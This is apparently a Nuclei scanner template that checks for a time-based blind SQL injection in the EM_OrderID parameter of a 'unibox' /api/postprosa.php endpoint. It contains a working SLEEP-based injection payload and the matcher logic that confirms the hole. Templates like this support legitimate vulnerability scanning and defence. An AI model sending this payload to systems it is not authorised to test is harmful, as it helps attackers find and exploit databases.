id: unibox-postprosa-SqlInjection

info:
  name: unibox-postprosa-SqlInjection
  author: iSee857
  severity: high
  description: |
    unibox-postprosa-SqlInjection.

http:
  - raw:
      - |
        POST /api/postprosa.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        EM_OrderID=1'+AND+(SELECT+3676+FROM+(SELECT(SLEEP(5)))sdgB)+AND+'rBTA'%3d'rBTA

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - text/html
        condition: and

      - type: dsl
        dsl:
          - 'status_code == 500 && duration>=5'